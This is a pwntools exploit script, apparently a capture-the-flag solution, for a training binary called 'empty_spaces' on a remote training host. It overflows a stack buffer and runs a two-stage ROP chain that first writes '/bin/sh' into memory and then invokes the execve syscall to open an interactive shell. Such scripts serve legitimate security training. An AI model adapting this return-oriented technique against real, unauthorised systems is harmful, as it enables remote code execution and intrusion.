from pwn import *


# breakpoints
# 0x000000000040198c alla read del buffer
# 0x0000000000401998 chiamata funzione "empty"

COMMANDS= """
break main
break *0x000000000040198c
break *0x0000000000401998
c
"""

chall_path = "./empty_spaces"

if args.REMOTE:
    c = remote("empty-spaces.training.offensivedefensive.it", 8080, ssl=True)
else:
    if args.GDB:
        c = gdb.debug(chall_path, gdbscript=COMMANDS)
    else:
        c = process(chall_path)

c.recvuntil(b"pwn?")
input("First round of main, waiting for input:")

payload = b"A" * 72                                         # reaching saved rip
payload += b"\xb3\x87\x47\x00\x00\x00\x00\x00"              # gadget address -> pop rdi; ret (0x4787b3)
payload += p64(0)                                           # rdi 
payload += b"\x3d\x7d\x47\x00\x00\x00\x00\x00"              # gadget address -> pop rsi, ret (0x477d3d)
payload += b"\x00\xc0\x4a\x00\x00\x00\x00\x00"              # rsi where to put /bin/sh (0x4ac000)
payload += b"\x30\x96\x41\x00\x00\x00\x00\x00"              # read address (0x419630)
payload += b"\x22\x19\x40\x00\x00\x00\x00\x00"              # main address to execute the main again

c.send(payload)

input("waiting for 'read' input: ")
c.send(b"/bin/sh\0")

input("Second round of main, waiting for input:")
payload_2 = b"A" * 72                                       # reaching saved rip again
payload_2 += b"\x27\x07\x45\x00\x00\x00\x00\x00"            # gadget address -> xchg edx, eax ; sub eax, edx; ret (to put 0 in rdx)
payload_2 += b"\x6b\x14\x42\x00\x00\x00\x00\x00"            # gadget address -> pop rax, ret
payload_2 += b"\x3b\x00\x00\x00\x00\x00\x00\x00"            # rax: 0x3b
payload_2 += b"\xb3\x87\x47\x00\x00\x00\x00\x00"            # gadget address -> pop rdi, ret
payload_2 += b"\x00\xc0\x4a\x00\x00\x00\x00\x00"            # rdi: 0x4ac000 where we have /bin/sh
payload_2 += b"\x3d\x7d\x47\x00\x00\x00\x00\x00"            # gadget address -> pop rsi, ret
payload_2 += p64(0)                                         # rsi: 0
payload_2 += b"\x24\x13\x40\x00\x00\x00\x00\x00"            # syscall

c.send(payload_2)
c.interactive()